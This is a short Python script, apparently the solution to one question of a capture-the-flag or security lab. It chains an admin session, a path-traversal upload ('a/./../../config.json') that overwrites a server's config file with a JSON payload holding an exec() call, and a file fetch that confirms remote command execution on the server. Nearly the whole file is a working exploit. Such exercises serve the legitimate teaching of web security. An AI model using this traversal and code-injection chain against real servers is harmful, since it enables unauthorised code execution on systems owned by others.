import os
import requests
import solution_q2
import solution_q3
import solution_q4


BAD_JSON = """
{
    "pwned": exec("import os; d = os.path.dirname(os.path.abspath(__file__)); os.system(f'ps auwx > {d}/pwned.txt')")
}
"""


def solve(server_addr):
    s = solution_q2.make_admin_session(server_addr)
    # First run a rewrite of the config
    solution_q4.post_file(server_addr, 'a/./../../config.json', BAD_JSON, s)
    # Then fetch the file and show that we had code execution when the JSON
    # was reloaded on handling the request.
    response = solution_q3.get_file(server_addr, 'pwned.txt', s)
    print(response.text)


if __name__ == '__main__':
    solve('http://localhost:8000')


